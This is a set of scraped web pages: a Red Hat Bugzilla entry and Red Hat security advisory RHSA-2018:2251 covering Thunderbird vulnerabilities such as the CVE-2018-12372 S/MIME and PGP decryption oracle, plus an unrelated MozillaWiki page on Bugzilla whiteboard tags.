=== Content from bugzilla.redhat.com_f47c67c7_20250126_073637.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1598538)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1598538)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1598538)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 1598538

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 1598538**](show_bug.cgi?id=1598538)
(CVE-2018-12372)
- [CVE-2018-12372](https://access.redhat.com/security/cve/CVE-2018-12372) thunderbird: S/MIME and PGP decryption oracles can be built with HTML emails

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2018-12372 thunderbird: S/MIME and PGP decryption oracles can be built wi...

| | [Keywords](describekeywords.cgi): | Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | CLOSED ERRATA | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2018-12372 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | high | | [Severity:](page.cgi?id=fields.html#bug_severity) | high | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Red Hat Product Security | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [1598539](show_bug.cgi?id=1598539 "CLOSED NOTABUG - CVE-2018-12372 thunderbird: S/MIME and PGP decryption oracles can be built with HTML emails [fedora-all]") [1598540](show_bug.cgi?id=1598540) [1598644](show_bug.cgi?id=1598644) [1598645](show_bug.cgi?id=1598645) [1598646](show_bug.cgi?id=1598646) [1607204](show_bug.cgi?id=1607204) | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [1596475](show_bug.cgi?id=1596475) | | TreeView+ | [depends on](buglist.cgi?bug_id=1598538&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1598538&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2018-07-05 18:23 UTC by Laura Pardo | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2021-02-25 16:23 UTC ([History](show_activity.cgi?id=1598538)) | | [CC List:](page.cgi?id=fields.html#cclist) | 11 users (show)  alexl cschalle gecko-bugs-nobody gecko-bugs-nobody jhorak john.j5live pjasicek rhughes rstrode sandmann stransky | | Fixed In Version: | thunderbird 52.9 | | | Doc Type: | If docs needed, set a value | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2019-06-10 10:31:57 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | |    Links | System | ID | Private | Priority | Status | Summary | Last Updated | | Red Hat Product Errata | [RHSA-2018:2251](https://access.redhat.com/errata/RHSA-2018%3A2251) | 0 | None | None | None | 2018-07-24 21:35:06 UTC | | Red Hat Product Errata | [RHSA-2018:2252](https://access.redhat.com/errata/RHSA-2018%3A2252) | 0 | None | None | None | 2018-07-24 21:34:23 UTC | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1598538#c0)  Laura Pardo    2018-07-05 18:23:18 UTC  ``` A flaw was found in Mozilla Thunderbird before version 52.9. Decrypted S/MIME parts, when included in HTML crafted for an attack, can leak plaintext when included in a a HTML reply/forward.   References: <https://www.mozilla.org/en-US/security/advisories/mfsa2018-18/#CVE-2018-12372>   ```  [Comment 1](show_bug.cgi?id=1598538#c1)  Laura Pardo    2018-07-05 18:23:48 UTC  ``` Created thunderbird tracking bugs for this issue:  Affects: fedora-all [[bug 1598539](show_bug.cgi?id=1598539 "CLOSED NOTABUG - CVE-2018-12372 thunderbird: S/MIME and PGP decryption oracles can be built with HTML emails [fedora-all]")]   ```  [Comment 5](show_bug.cgi?id=1598538#c5)  errata-xmlrpc    2018-07-24 21:34:17 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 7  Via RHSA-2018:2252 [https://access.redhat.com/errata/RHSA-2018:2252](https://access.redhat.com/errata/RHSA-2018%3A2252)   ```  [Comment 6](show_bug.cgi?id=1598538#c6)  errata-xmlrpc    2018-07-24 21:34:59 UTC  ``` This issue has been addressed in the following products:    Red Hat Enterprise Linux 6  Via RHSA-2018:2251 [https://access.redhat.com/errata/RHSA-2018:2251](https://access.redhat.com/errata/RHSA-2018%3A2251)   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1598538&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)



=== Content from wiki.mozilla.org_ef8238f3_20250126_073633.html ===


# BMO/UserGuide/Whiteboard

From MozillaWiki
< [BMO](/BMO "BMO")‎ | [UserGuide](/BMO/UserGuide "BMO/UserGuide")

[Jump to navigation](#mw-head)
[Jump to search](#searchInput)

Each bug has a free-form single line text entry box for adding tags and status information. This wiki page is dedicated to collect a comprehensive list of whiteboard tags used in the Mozilla project.

## Contents

* [1 Whiteboard considered harmful](#Whiteboard_considered_harmful)
* [2 Contributor mentoring](#Contributor_mentoring)
* [3 Automated Testing](#Automated_Testing)
* [4 Autonag](#Autonag)
* [5 Release Engineering](#Release_Engineering)
* [6 Sheriffing](#Sheriffing)
* [7 Firefox](#Firefox)
* [8 Community reported bugs](#Community_reported_bugs)
* [9 Firefox OS](#Firefox_OS)
* [10 Tor](#Tor)
* [11 Web Compatibility](#Web_Compatibility)
* [12 Scrum Development](#Scrum_Development)
* [13 What does this whiteboard keyword mean?](#What_does_this_whiteboard_keyword_mean?)
## Whiteboard considered harmful

It is recommended that you request alternative metadata instead of using whiteboard tagging.

* Updating whiteboards tags through the API is non-trivial
* There is no global auto-suggest for whiteboard tags
* There is no verification of whiteboard tags; typos will not be caught and prevented
* Renaming a whiteboard tag requires writing a script to update every bug with that tag, changing its last modified timestamp and generating bugmail; other solutions involve a simple change by administrators
* Whiteboard tags cannot be disabled; people might continue to provide them after they are no longer relevant thinking they still apply
* If desired it's possible to restrict who can set flags to particular values; it will never be possible to prevent accidental or other changes to the whiteboard from any user with editbugs or the bug's reporter

Consider using a keyword, a flag, or a status flag. You can request this on [Bugzilla](https://bugzilla.mozilla.org/enter_bug.cgi?product=bugzilla.mozilla.org&component=Administration).

## Contributor mentoring

For more information, see [Mentors](/Mentors "Mentors").

* `[lang=]`: The programming language involved for this bug.
* `[mentor-lang=]`: (human/natural) language other than English the mentor will be able to communicate to the contributor with.

## Automated Testing

* `[test disabled]`: Indicates an automated test has been disabled. Typically used in bugs filed for intermittent test failures, to indicate that the absence of new failures in the bug is due to the test being disabled - as well as remind module owners that the test needs fixing and re-enabling.

## Autonag

`[no-nag]`: Indicates that a bug should not be modified or commented in by our [Autonag](/Release_Management/autonag "Release Management/autonag") scripts.

## Release Engineering

* `[capacity]`: This bug will help increase (or free up) capacity for our automated build & test machines.

## Sheriffing

* `[leave open]`: This has [been deprecated](https://groups.google.com/forum/#!topic/mozilla.dev.platform/Ie9OXcWbTSs) in favour of the 'leave-open' keyword. Used to ensure that the bug updating tool mcMerge does not close the bug when commits referencing it are merged into mozilla-central.
* `[retriggered]`: Used by sheriffs when investigating Fresh Oranges [[1]](https://charts.mozilla.org/FreshOranges/index.html) to find where a failure started from, using backfills and retriggers

## Firefox

* `dupeme`, `dupme`, or `DUPEME`: we're pretty sure this bug report is a duplicate of another bug, but cannot recall which one or cannot find it.
* `[qa-]`: QE (Quality Engineering) verification not required - superseded by the qe-verify flag.
* `[adv-mainNN+]` (where `NN` is some number): a security advisory about this bug for the release `NN` will be (has been) written.
* `[MemShrink]`: [a project](/Performance/MemShrink "Performance/MemShrink") to reduce memory consumption.

## Community reported bugs

* `[nightly-community]`: This bug was reported by a member of the Firefox Nightly community. Used to triage community-reported bugs and measure the impact of our core community on product quality.
* `[mozfr-community]`: This bug was reported by a member of the MozFR French-speaking community. Used to evaluate the impact of the mozfr.org community on product quality.

## Firefox OS

[Template:Note: This project is no longer active, but we leave these definitions for bug tracker historian purposes](/index.php?title=Template:Note:_This_project_is_no_longer_active,_but_we_leave_these_definitions_for_bug_tracker_historian_purposes&action=edit&redlink=1 "Template:Note: This project is no longer active, but we leave these definitions for bug tracker historian purposes (page does not exist)")

* `[POVB]`: Part of vendor build; the fix of this bug is not in the Mozilla codebase, but it's in our interest to track it.
* `[priority]`: Indicates we are asked by a partner to address this issue with priority.
* `[tarako_only]`: Special pref or feature that only lands on branch for Tarako (low memory phone), i.e. 1.3T branch of Gaia and Gecko. To be picked up on future releases.
* `[p=]/[u=]/[c=]/[s=]`: See [Scrum Development](/BMO/Whiteboard#Scrum_Development "BMO/Whiteboard"). Firefox OS uses the u= tag as the milestone instead, see [Firefox OS Performance Triage](/FirefoxOS/Performance/Triage#Scrumbugs_Tags "FirefoxOS/Performance/Triage")
* `[ft:<name of the team>]`, `[systemsfe]`, etc: Bugs identified to be owned by a "functional team" within B2G engineering. Each team owns a specific set of Bugzilla components, and tags are used to denote owned bugs outside of these components.

## Tor

* `[tor ###]` Part of the [Tor uplift project](/Security/Tor_Uplift/Tracking "Security/Tor Uplift/Tracking"). For example, `[tor 16620]` indicates a corresponding ticket at <https://trac.torproject.org/16620>. See also <https://torpat.ch/uplift>

## Web Compatibility

[Our whiteboard keywords](/Compatibility/BugsGuide "Compatibility/BugsGuide") are already described.

## Scrum Development

The following flags are used by tools like [scrumbu.gs](https://scrumbu.gs/help/) for managing sprints using the scrum development framework:

* `[p=]`: A rough estimate from engineer on how long the bug is going to take.
* `[u=]`: The user (in the scrum sense) that this story affects
* `[c=]`: The component (in the scrum sense) that this story affects
* `[s=]`: An explicit sprint slug this bug should belong to.

If you are not managing a product, you probably don't have to set these.

## What does this whiteboard keyword mean?

If you know what one of the following whiteboard keywords means, please describe it and put it into one of the above categories above (or create a new one):

* `[2.0-FL-bug-bash]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=1021384>)
* `[games]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=1017892>)
* `[reserve-photon-structure]` ([examples](https://bugzilla.mozilla.org/buglist.cgi?list_id=14108939&status_whiteboard_type=substring&status_whiteboard=%5Breserve-photon-structure%5D&order=Bug%20Number&query_format=advanced))
* `[TCP]` (example: <https://bugzilla.mozilla.org/show_bug.cgi?id=920036>)
  + my guess: Tablet Contribution Program?

Retrieved from "<https://wiki.mozilla.org/index.php?title=BMO/UserGuide/Whiteboard&oldid=1245932>"

## Navigation menu

### Personal tools

* [Log in](/index.php?title=Special:UserLogin&returnto=BMO%2FUserGuide%2FWhiteboard "You are encouraged to log in; however, it is not mandatory [o]")
* [Request account](/Special%3ARequestAccount "You are encouraged to create an account and log in; however, it is not mandatory")

### Namespaces

* [Page](/BMO/UserGuide/Whiteboard "View the content page [c]")
* [Discussion](/index.php?title=Talk:BMO/UserGuide/Whiteboard&action=edit&redlink=1 "Discussion about the content page (page does not exist) [t]")

English

### Views

* [Read](/BMO/UserGuide/Whiteboard)
* [View source](/index.php?title=BMO/UserGuide/Whiteboard&action=edit "This page is protected.
  You can view its source [e]")
* [View history](/index.php?title=BMO/UserGuide/Whiteboard&action=history "Past revisions of this page [h]")

More

### Search

### Navigation

* [Main page](/Main_Page "Visit the main page [z]")
* [Product releases](/Releases)
* [New pages](/Special%3ANewPages)
* [Recent changes](/Special%3ARecentChanges "A list of recent changes in the wiki [r]")
* [Recent uploads](/Special%3ANewFiles)
* [Random page](/Special%3ARandom "Load a random page [x]")
* [Help](/MozillaWiki%3AHelp "The place to find out")

### How to Contribute

* [All-hands meeting](/WeeklyUpdates)
* [Other meetings](/Community_Calendar)
* [Contribute to Mozilla](/Contribute)
* [Community Portal](//community.mozilla.org)
* [Community Participation Guidelines](//www.mozilla.org/en-US/about/governance/policies/participation/)

### MozillaWiki

* [About](/MozillaWiki%3AAbout)
* [Team](/MozillaWiki%3ATeam)
* [Policies](/MozillaWiki%3APolicies)
* [Report a wiki bug](//bugzilla.mozilla.org/enter_bug.cgi?product=Websites&component=wiki.mozilla.org)

### Around Mozilla

* [Mozilla Support](//support.mozilla.org/)
* [Mozilla Developer Network](//developer.mozilla.org/)
* [Planet Mozilla](//planet.mozilla.org/)
* [Mozilla Blog](//blog.mozilla.org/)
* [Research](//www.mozilla.org/research/)

### Tools

* [What links here](/Special%3AWhatLinksHere/BMO/UserGuide/Whiteboard "A list of all wiki pages that link here [j]")
* [Related changes](/Special%3ARecentChangesLinked/BMO/UserGuide/Whiteboard "Recent changes in pages linked from this page [k]")
* [Special pages](/Special%3ASpecialPages "A list of all special pages [q]")
* Printable version
* [Permanent link](/index.php?title=BMO/UserGuide/Whiteboard&oldid=1245932 "Permanent link to this revision of this page")
* [Page information](/index.php?title=BMO/UserGuide/Whiteboard&action=info "More information about this page")

* This page was last edited on 27 March 2023, at 15:08.

* [Privacy policy](/MozillaWiki%3APrivacy_policy)
* [About MozillaWiki](/MozillaWiki%3AAbout)
* [Mobile view](https://wiki.mozilla.org/index.php?title=BMO/UserGuide/Whiteboard&mobileaction=toggle_view_mobile)

* [![Powered by MediaWiki](/resources/assets/poweredby_mediawiki_88x31.png)](https://www.mediawiki.org/)



=== Content from access.redhat.com_e5366078_20250125_084119.html ===

Note: Our personalized web services require that your browser be enabled for JavaScript and cookies

[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

[Red Hat Product Errata](/errata)
RHSA-2018:2251 - Security Advisory

Issued:
2018-07-24
Updated:
2018-07-24
# RHSA-2018:2251 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Important: thunderbird security update

## Type/Severity

Security Advisory: Important

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2018%3A2251)

## Topic

An update for thunderbird is now available for Red Hat Enterprise Linux 6.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

Mozilla Thunderbird is a standalone mail and newsgroup client.

This update upgrades Thunderbird to version 52.9.1.

Security Fix(es):

* Mozilla: Memory safety bugs fixed in Firefox 61, Firefox ESR 60.1, and Firefox ESR 52.9 (CVE-2018-5188)
* Mozilla: Buffer overflow using computed size of canvas element (CVE-2018-12359)
* Mozilla: Use-after-free using focus() (CVE-2018-12360)
* Mozilla: Integer overflow in SSSE3 scaler (CVE-2018-12362)
* Mozilla: Use-after-free when appending DOM nodes (CVE-2018-12363)
* Mozilla: CSRF attacks through 307 redirects and NPAPI plugins (CVE-2018-12364)
* thunderbird: S/MIME and PGP decryption oracles can be built with HTML emails (CVE-2018-12372)
* thunderbird: S/MIME plaintext can be leaked through HTML reply/forward (CVE-2018-12373)
* Mozilla: Compromised IPC child process can list local filenames (CVE-2018-12365)
* Mozilla: Invalid data handling during QCMS transformations (CVE-2018-12366)
* thunderbird: Using form to exfiltrate encrypted mail part by pressing enter in form field (CVE-2018-12374)

For more details about the security issue(s), including the impact, a CVSS score, and other related information, refer to the CVE page(s) listed in the References section.

Red Hat would like to thank the Mozilla project for reporting these issues. Upstream acknowledges Alex Gaynor, Christoph Diehl, Christian Holler, Jason Kratzer, David Major, Jon Coppeard, Nicolas B. Pierron, Marcia Knous, Ronald Crane, Nils, F. Alonso (revskills), David Black, and OSS-Fuzz as the original reporters.

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

All running instances of Thunderbird must be restarted for the update to take effect.

## Affected Products

* Red Hat Enterprise Linux Server 6 x86\_64
* Red Hat Enterprise Linux Server 6 i386
* Red Hat Enterprise Linux Server - Extended Life Cycle Support 6 x86\_64
* Red Hat Enterprise Linux Server - Extended Life Cycle Support 6 i386
* Red Hat Enterprise Linux Workstation 6 x86\_64
* Red Hat Enterprise Linux Workstation 6 i386
* Red Hat Enterprise Linux Desktop 6 x86\_64
* Red Hat Enterprise Linux Desktop 6 i386
* Red Hat Enterprise Linux for IBM z Systems 6 s390x
* Red Hat Enterprise Linux for Power, big endian 6 ppc64
* Red Hat Enterprise Linux Server - Extended Life Cycle Support (for IBM z Systems) 6 s390x
* Red Hat Enterprise Linux Server - Extended Life Cycle Support Extension 6 x86\_64
* Red Hat Enterprise Linux Server - Extended Life Cycle Support Extension 6 i386
* Red Hat Enterprise Linux Server - Extended Life Cycle Support Extension (for IBM z Systems) 6 s390x

## Fixes

* [BZ - 1595024](https://bugzilla.redhat.com/show_bug.cgi?id=1595024)
  - CVE-2018-12359 Mozilla: Buffer overflow using computed size of canvas element
* [BZ - 1595025](https://bugzilla.redhat.com/show_bug.cgi?id=1595025)
  - CVE-2018-12360 Mozilla: Use-after-free using focus()
* [BZ - 1595027](https://bugzilla.redhat.com/show_bug.cgi?id=1595027)
  - CVE-2018-12362 Mozilla: Integer overflow in SSSE3 scaler
* [BZ - 1595028](https://bugzilla.redhat.com/show_bug.cgi?id=1595028)
  - CVE-2018-12363 Mozilla: Use-after-free when appending DOM nodes
* [BZ - 1595029](https://bugzilla.redhat.com/show_bug.cgi?id=1595029)
  - CVE-2018-12364 Mozilla: CSRF attacks through 307 redirects and NPAPI plugins
* [BZ - 1595030](https://bugzilla.redhat.com/show_bug.cgi?id=1595030)
  - CVE-2018-12365 Mozilla: Compromised IPC child process can list local filenames
* [BZ - 1595031](https://bugzilla.redhat.com/show_bug.cgi?id=1595031)
  - CVE-2018-12366 Mozilla: Invalid data handling during QCMS transformations
* [BZ - 1595040](https://bugzilla.redhat.com/show_bug.cgi?id=1595040)
  - CVE-2018-5188 Mozilla: Memory safety bugs fixed in Firefox 61, Firefox ESR 60.1, and Firefox ESR 52.9
* [BZ - 1598529](https://bugzilla.redhat.com/show_bug.cgi?id=1598529)
  - CVE-2018-12373 thunderbird: S/MIME plaintext can be leaked through HTML reply/forward
* [BZ - 1598538](https://bugzilla.redhat.com/show_bug.cgi?id=1598538)
  - CVE-2018-12372 thunderbird: S/MIME and PGP decryption oracles can be built with HTML emails
* [BZ - 1598543](https://bugzilla.redhat.com/show_bug.cgi?id=1598543)
  - CVE-2018-12374 thunderbird: Using form to exfiltrate encrypted mail part by pressing enter in form field

## CVEs

* [CVE-2018-5188](https://www.redhat.com/security/data/cve/CVE-2018-5188.html)
* [CVE-2018-12359](https://www.redhat.com/security/data/cve/CVE-2018-12359.html)
* [CVE-2018-12360](https://www.redhat.com/security/data/cve/CVE-2018-12360.html)
* [CVE-2018-12362](https://www.redhat.com/security/data/cve/CVE-2018-12362.html)
* [CVE-2018-12363](https://www.redhat.com/security/data/cve/CVE-2018-12363.html)
* [CVE-2018-12364](https://www.redhat.com/security/data/cve/CVE-2018-12364.html)
